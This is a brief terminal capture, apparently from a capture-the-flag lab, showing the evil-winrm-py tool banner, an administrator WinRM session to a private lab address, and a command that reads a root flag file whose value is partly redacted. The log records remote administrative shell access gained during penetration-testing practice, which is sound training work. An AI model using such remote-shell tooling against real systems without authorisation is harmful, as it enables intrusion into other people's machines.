          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to '10.129.16.55:5985' as 'administrator'
evil-winrm-py PS C:\Users\Administrator\Documents> cat c:\users\max.palmer\desktop/root.txt
74da........3c46


```

